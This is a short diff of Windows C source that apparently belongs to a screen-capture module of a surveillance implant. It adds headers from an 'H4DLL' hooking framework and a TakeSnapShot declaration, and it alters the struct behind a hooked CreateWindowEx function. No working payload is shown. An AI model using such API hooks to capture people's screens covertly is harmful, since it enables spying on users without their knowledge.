@@ -1,3 +1,17 @@
+#define _CRT_SECURE_NO_WARNINGS 1
+
+#include <Windows.h>
+#include <json/JSON.h>
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/H4-DLL.h"
+#include "../../H4DLL/bss.h"
+#include "../../H4DLL/AM_Core.h"
+#include "../../H4DLL/HM_IpcModule.h"
+#include "../../H4DLL/HM_InbundleHook.h"
+#include "screenshot.h"
+
+void TakeSnapShot(HWND grabwind, BOOL only_window, DWORD quality);
+
 extern BOOL g_newwindow_created;
 
 #define SNAP_IMG_QUALITY_LOW 10
@@ -7,10 +21,6 @@ extern BOOL g_newwindow_created;
 BOOL capture_only_window = FALSE;
 DWORD image_quality = SNAP_IMG_QUALITY_MED;
 
-// Hook per la notifica di creazione di nuove finestre
-typedef struct {
-	COMMONDATA;
-} CreateWindowExStruct;
 CreateWindowExStruct CreateWindowExData;
 
 HWND __stdcall PM_CreateWindowEx(DWORD dwExStyle,
